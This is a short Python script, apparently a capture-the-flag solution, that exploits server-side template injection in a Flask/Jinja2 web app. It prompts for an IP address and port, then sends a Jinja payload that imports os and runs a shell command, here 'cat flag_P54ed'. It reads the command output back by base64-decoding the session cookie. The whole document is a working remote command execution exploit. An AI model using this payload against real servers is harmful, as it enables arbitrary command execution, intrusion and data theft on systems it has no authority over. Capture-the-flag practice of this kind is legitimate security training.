import requests
import base64
payload = "/?name={%+if+session.update({request.args.se:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.command).read()})+==+1+%}{%+endif+%}&se=asdf&os=os&command="

ip = input("ip :> ")
port = input("port :> ")

if requests.get("http://"+ip+":"+port).status_code == 200 :
	try:	
		s = requests.Session()
		s.get("http://"+ip+":"+port+"/"+payload+"cat flag_P54ed")
		session = s.cookies.get_dict()['session']
		session += "=" * ((4 - len(session) % 4) % 4)
		convert_bytes_sessionDecode = bytes(session,'utf-8')
		sessionDecode_step_1 = base64.b64decode(convert_bytes_sessionDecode)
		sessionDecode_step_2 = str(sessionDecode_step_1).split('"')
		convert_bytes_sessionDecode_2 = bytes(sessionDecode_step_2[5],'utf-8')
		final_res = base64.b64decode(convert_bytes_sessionDecode_2)
		print(str(final_res))
	except:
		print("Test again")
	
